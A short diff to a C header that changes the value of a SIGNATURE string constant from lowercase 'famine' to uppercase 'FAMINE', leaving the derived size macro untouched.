@@ -8,7 +8,7 @@
 #include <stdint.h> // uintX_t
 
 /* Defines */
-#define SIGNATURE "famine"
+#define SIGNATURE "FAMINE"
 #define SIGNATURE_SIZE (sizeof(SIGNATURE) - 1)
 
 /* Structures */
